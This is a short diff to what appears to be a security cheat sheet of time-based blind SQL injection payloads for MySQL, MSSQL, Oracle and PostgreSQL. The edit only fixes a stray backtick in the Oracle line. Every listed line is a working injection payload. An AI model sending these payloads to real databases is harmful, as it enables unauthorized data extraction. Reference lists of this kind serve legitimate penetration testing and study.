@@ -67,7 +67,7 @@
 ```
 ● MySQL                         : ' AND (SELECT IF(condition, SLEEP(10), 'a'))--
 ● MSSQL                         : '; (IF (condition) WAITFOR DELAY '0:0:10')--
-● Oracle                        : ' || (SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual`)--
+● Oracle                        : ' || (SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual)--
 ● PostgreSQL                    : ' || (SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END) || '--
 ```
 #### 
